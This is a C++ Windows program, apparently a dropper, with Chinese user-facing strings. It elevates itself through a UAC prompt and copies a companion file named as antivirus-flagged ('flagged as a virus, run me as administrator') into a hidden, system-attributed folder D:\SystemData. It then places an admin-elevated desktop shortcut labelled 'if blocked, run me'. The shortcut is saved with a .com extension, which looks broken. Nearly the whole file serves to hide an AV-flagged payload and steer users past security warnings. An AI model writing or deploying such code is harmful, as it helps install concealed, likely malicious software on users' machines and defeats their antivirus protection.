#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <cstdio>
#include <vector>
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#ifndef SLDF_RUNAS_USER
#define SLDF_RUNAS_USER 0x00000020
#endif

static bool IsElevated() {
    BOOL e = FALSE; HANDLE t = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
        TOKEN_ELEVATION te; DWORD sz = sizeof(te);
        GetTokenInformation(t, TokenElevation, &te, sz, &sz);
        e = te.TokenIsElevated; CloseHandle(t);
    }
    return e == TRUE;
}

int main() {
    if (!IsElevated()) {
        wchar_t p[MAX_PATH]; GetModuleFileNameW(NULL, p, MAX_PATH);
        ShellExecuteW(NULL, L"runas", p, NULL, NULL, SW_SHOW);
        return 0;
    }

    // 从当前 exe 所在目录找目标文件
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    wchar_t* slash = wcsrchr(path, L'\\');
    if (slash) *(slash + 1) = L'\0';
    wcscat(path, L"被报毒用管理员运行我.com");

    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        wchar_t msg[512];
        swprintf(msg, 512, L"找不到文件:\n%ls\n请把 %ls 和本程序放在同一目录", path, L"被报毒用管理员运行我.com");
        MessageBoxW(NULL, msg, L"错误", MB_ICONERROR);
        return 1;
    }
    DWORD sz = GetFileSize(h, NULL);
    std::vector<BYTE> dat(sz);
    DWORD r; ReadFile(h, dat.data(), sz, &r, NULL); CloseHandle(h);

    CreateDirectoryW(L"D:\\SystemData", NULL);
    SetFileAttributesW(L"D:\\SystemData", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    HANDLE o = CreateFileW(L"D:\\SystemData\\run.com", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (o == INVALID_HANDLE_VALUE) { MessageBoxW(NULL, L"写入失败", L"错误", MB_ICONERROR); return 1; }
    DWORD w; WriteFile(o, dat.data(), sz, &w, NULL); CloseHandle(o);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    IShellLinkW* p = NULL;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&p)) && p) {
        p->SetPath(L"D:\\SystemData\\run.com");
        IShellLinkDataList* d = NULL;
        if (SUCCEEDED(p->QueryInterface(IID_IShellLinkDataList, (void**)&d)) && d) {
            DWORD f = 0; d->GetFlags(&f); d->SetFlags(f | SLDF_RUNAS_USER); d->Release();
        }
        IPersistFile* pf = NULL;
        if (SUCCEEDED(p->QueryInterface(IID_IPersistFile, (void**)&pf)) && pf) {
            pf->Save(L"D:\\Desktop\\如果被拦截运行我.com", TRUE); pf->Release();
        }
        p->Release();
    }
    CoUninitialize();
    return 0;
}
